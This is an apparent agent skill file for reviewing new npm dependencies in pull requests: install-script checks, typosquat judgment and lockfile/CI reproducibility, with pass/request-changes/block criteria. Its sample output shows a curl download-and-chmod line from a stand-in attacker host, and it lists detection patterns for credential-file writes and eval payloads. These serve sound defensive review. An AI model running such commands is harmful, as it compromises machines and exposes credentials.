---
name: supply-chain-review
description: 'Quick PR/new-dependency supply-chain review: dangerous install/postinstall script checks, typosquat name-similarity judgment, reproducible-build verification, each with false-positive criteria and a pass / request-changes / block three-tier decision threshold. Use when reviewing a PR that introduces new dependencies or when a quick verdict on new-dependency risk is needed; ordinary code review unrelated to new dependencies does not use this skill.'
whenToUse: 'Use when reviewing a PR that adds new dependencies (package.json/lockfile changes), inspecting a package install-script behavior, judging a suspected typosquat package, or verifying build reproducibility. Plain business-code PR reviews unrelated to new dependencies do not trigger this skill.'
metadata:
  pack: dsh-skill-pack-security
  version: '2.2.6'
---
# New-dependency quick review (supply-chain-review)

Goal: within PR-review time (minutes), give each new dependency a **pass / request changes / block** verdict; every verdict must carry command evidence and a false-positive exclusion note.

## Automated pre-check: the plugin_vet tool

`plugin_vet` already runs the static parts of sections 1/2/3 (dangerous install scripts, network exfiltration, obfuscated payloads, commit/action pinning), and its findings cite those section numbers. After an automated hit, apply each section's false-positive and allowlist criteria manually before giving the three-tier verdict.

## 0. Confirm the scope

```sh
git diff <base>...HEAD --stat -- package.json pnpm-lock.yaml
git diff <base>...HEAD --unified=0 -- package.json | grep '^+'
```

Sample output:

```
 package.json      | 4 ++++
 pnpm-lock.yaml    | 12 ++++++++++++
+    "example-lib": "^2.3.0",
```

Criterion: no manifest change → this skill does not apply, stop; devDependencies-only changes → one tier lower overall ("does not enter production output"), but the script checks still run.
Use the PR's real `<base>` (confirm with `git merge-base <base> HEAD` first) — never guess it.

## 1. Dangerous install-script check (block-level candidate)

For every new package run:

```sh
npm view <package> scripts --json
```

Sample output: `{ "postinstall": "node scripts/download.js" }`.
Dangerous-pattern list (the full version and the verification grep live in `references/install-script-checks.md`):

- `curl`/`wget`/`Invoke-WebRequest` downloading an executable and then running it;
- `base64 -d`/`eval`/`child_process.exec`/`os.system` combined with external input or an assembled payload;
- Writing into `~/.ssh`, `.npmrc`, `.gitconfig`, credentials, or global shell configuration.

Verification command (unpack and read the real content — never trust the manifest description alone):

```sh
npm pack <package> --pack-destination .tmp
tar -xzf .tmp/<package>-<version>.tgz -C .tmp
grep -rnE '(curl|wget|base64|eval|\.ssh|npmrc)' .tmp/package/package.json .tmp/package/*.js
```

Sample output: `.tmp/package/scripts/download.js:3:curl -sSL https://evil.example/x -o /tmp/x && chmod +x /tmp/x`
False-positive criterion: **build-toolchain install scripts are ecosystem convention** (esbuild, sharp, node-gyp, core-js, and so on) — the clearance criterion is: the script behavior matches the package's purpose **and** it does not touch user credentials or global configuration; failing either = block.
Block conditions (any one blocks): downloading and executing a binary, accessing credential files, obfuscated payloads (base64/hex assembled then eval), writing global configuration after install.
Git-install vector: when a dependency comes from a git URL (DSH git installs run `prepare` scripts), `npm view` cannot see its scripts — locate it with `git grep -nE 'git\+https?://' -- package.json` first, then `git clone --depth 1 <url> .tmp/gitdep` and `grep -nE '"(prepare|preinstall)"' .tmp/gitdep/package.json`; `prepare` runs at install time, so treat it like postinstall.
Package-body anomalies: `npm view <package> dist.fileCount dist.tarball --json`. Criterion: an abnormally large fileCount (for example > 1000) or a tarball host that is not `registry.npmjs.org` → record and review manually.

## 2. Typosquat check

For every new package name:

```sh
npm view <package> time.created
npm view <package> --json | grep -E '"downloads"|"weekly"'
```

Sample output: `2026-08-10T02:00:00.000Z` (created two weeks ago); the downloads field may be absent (some registries do not return it — treat a missing value as "unknown", never conclude from it alone).
Name comparison: compare edit distance against popular packages one by one (confusion-pair list and the command live in `references/typosquat-and-reproducibility.md`), e.g. `lodahs` vs `lodash`, `react-domm` vs `react-dom`.
Criterion: **edit distance ≤ 2 from a popular package AND short creation time / extremely low downloads, both at once → block**; only one of them → request changes and re-check with the `dependency-audit` poisoning checklist.
False-positive criterion: an obscure same-named package from a completely unrelated domain is not killed by "low downloads" alone — "name similarity + suspicious context" must hold together.

## 3. Reproducible-build verification

```sh
git ls-files -- '*lock*' | head -n 5
grep -nE 'frozen-lockfile|npm ci|--frozen' .github/workflows/* 2>/dev/null
grep -c 'integrity' <lockfile>
pnpm install --frozen-lockfile
```

Sample output: one lockfile path line; the CI hit line `install: pnpm install --frozen-lockfile`; an integrity count of `1234`.
Criterion (three factors, see `references/typosquat-and-reproducibility.md`):
- Lockfile committed + CI frozen install + integrity fields complete = pass;
- Any one missing = request changes;
- No lockfile **and** more than 20 new direct dependencies = block.
- A failing `pnpm install --frozen-lockfile` goes to `dependency-audit` Section 5 for the sample and handling; a platform difference never justifies turning off the frozen switch.
- CI-configuration review (required when the PR touches workflows): `git diff <base>...HEAD -- .github/workflows | grep -nE '^\+.*uses:'` — a new/changed `uses: <owner>/<repo>@v<number>` not pinned to a commit SHA (`@<40-hex>`) → request changes (tags can be moved); read-only third-party actions that never touch secrets are recorded, not blocked.
- Lockfile growth review: compare `git diff <base>...HEAD -- <lockfile> | grep -cE '^\+'` with the number of new direct dependencies; 1 declared dependency but +500 lines → record and inspect the diff manually.

## 4. Verdict and comment template

The three-tier definitions, trigger conditions, and PR-comment templates live in `references/typosquat-and-reproducibility.md`.
Every verdict must include: evidence command + output summary + false-positive exclusion note ("I excluded X because <evidence>").
